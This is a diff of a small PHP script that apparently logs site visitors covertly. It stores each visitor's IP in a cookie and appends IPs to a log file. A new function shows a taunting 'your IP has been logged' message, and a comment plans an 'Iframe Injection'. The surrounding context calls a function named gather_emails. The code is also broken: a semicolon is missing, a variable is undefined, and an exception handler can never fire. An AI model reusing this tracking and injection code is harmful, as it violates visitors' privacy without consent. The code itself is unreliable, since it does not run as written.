@@ -119,23 +119,35 @@ gather_emails();
 function set_ckies(){
     $IP = $_SERVER['REMOTE_ADDR'];
 $wrcokie = setcookie("yo" , "$IP");
-echo "<script>console.warn($wrcokie);</script>";
+//echo "<script>console.warn($wrcokie);</script>";
 echo "<script>console.error('Above are the amount of cookies in your session');</script>";
 }
 set_ckies();
+function redird($uri){
+    try{
+        $HTTACCEPT = $_SERVER['HTTP_ACCEPT'];
+        $img_grabber = @imagecreatefromjpeg("https://resources.altium.com/sites/default/files/blogs/Semiconductor%20Fiber%20Could%20Replace%20Fiber%20Optic%20Cable%20Transmission%20Lines-37745.jpg");
+        //echo "<iframe><script>d = document.location;</script></iframe>"; Update for Iframe Injection
 
+    }
+    catch (Exception $e){
+        $fp = fopen('iplog.txt', 'a');
+fwrite($fp, $ip .'\n');  
+fclose($fp)
+echo "<h1> Your Ipv4 address has been logged no matter how hard you really tried.</h1>";
+    }
+}
 /*header("Content-Type: image/png");
 $ip = $_SERVER['REMOTE_ADDR'];  
 $im = @imagecreate(110, 20)
     or die("Cannot Initialize new GD image stream");
 $background_color = imagecolorallocate($im, 0, 0, 0);
 $text_color = imagecolorallocate($im, 233, 14, 91);
-imagestring($im, 1, 5, 5,  "A example image made in php", $text_color);
+imagestring($im, 100, 50, 50,  "A example image made in php", $text_color);
 imagepng($im);
 imagedestroy($im);
 $fp = fopen('iplog.txt', 'a');
 fwrite($fp, $ip .'\n');  
 fclose($fp);
-
 */ 
 ?>
